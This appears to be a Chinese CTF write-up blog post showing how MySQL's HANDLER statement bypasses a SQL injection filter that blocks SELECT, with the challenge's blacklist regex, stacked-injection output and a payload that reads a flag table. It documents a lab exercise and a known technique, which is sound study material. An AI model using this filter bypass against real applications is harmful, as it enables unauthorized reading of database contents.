---
layout: post
title: "handler in sqlInjection"
subtitle: "handler in sqlInjection"
author: "Novocaine#p1an0@qq.com"
header-img: "img/post-bg-dreamer.jpg"
header-mask: 0.4
tags:
  - REVERSE
  - 二进制安全
  - x86Linux 
---

前言
--
- sql注入时，构造不出select 的确很让人头疼。
- 仔细想想，之前接触的sql语句并不能替代select关键字，在没有select，如何构造并查询数据？ 

0x01 WTF handler?
==
handler是mysql特有的查询语句，这个语句可以使我们一行一行地浏览mysql表，具体使用如下：

![image-20210120143638033](https://raw.githubusercontent.com/Rand0mPythoner/imgs/master//blog-imgimage-20210120143638033.png)

```
handler admin open; 		创建handler句柄
handler admin read FIRST;	读取第一行
handler admin read next;	往后读
handler admin read first limit 3;	读3条
handler admin close;		关闭句柄
```

比较高效率的查询方式：

![image-20210120144051117](https://raw.githubusercontent.com/Rand0mPythoner/imgs/master//blog-imgimage-20210120144051117.png)

0x02 handler in sqlinjection
==
这个技巧我尝试只能在堆叠注入中使用，利用在**强网杯 2019 随便注**

环境过滤了select insert update delete
```php
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

show databases:
```
array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}
```

show tables:
```
array(1) {
  [0]=>
  string(5) "flagg"
}

array(1) {
  [0]=>
  string(5) "words"
}
```

handler flagg open;handler flagg read first;

```
array(1) {
  [0]=>
  string(40) "QWB{b224696a66564e6b95dc8a6eb792bce7}"
}
```
